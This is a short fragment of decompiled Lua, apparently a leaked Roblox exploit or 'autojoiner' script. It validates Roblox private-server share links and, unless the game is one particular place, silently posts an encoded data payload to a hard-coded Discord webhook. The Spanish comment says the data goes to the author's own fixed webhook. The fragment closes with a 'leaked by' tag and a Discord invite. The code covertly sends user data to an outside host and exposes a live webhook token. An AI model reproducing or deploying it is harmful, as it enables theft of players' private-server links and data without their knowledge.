    ...
    if not l_Text_2:match("roblox.com/share") or not l_Text_2:match("code=") or not l_Text_2:match("type=Server") then
        ...
        task.spawn(function() --[[ Line: 0 ]]
            ...
            if game.PlaceId ~= 109983668079237 then
                ...
                -- Enviar directamente a TU webhook fijo de Discord
                pcall(function() --[[ Line: 0 ]]
                    -- upvalues: v7 (ref), l_HttpService_0 (ref), v113 (copy)
                    v7({
                        Url = "https://discord.com/api/webhooks/1431338050201456802/LmKpT4JUukt87773YDdBQwoOOcAZaHGXdpXdxIwk9hu_y4Ng_DSBa5-SnHGzH6-gf320",
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = l_HttpService_0:JSONEncode(v113)
                    })
                end)
...
end);--// leaked by mistafeast (@jan.dll) if you paid for this you got scammed.
-- // discord.gg/autojoining > All!
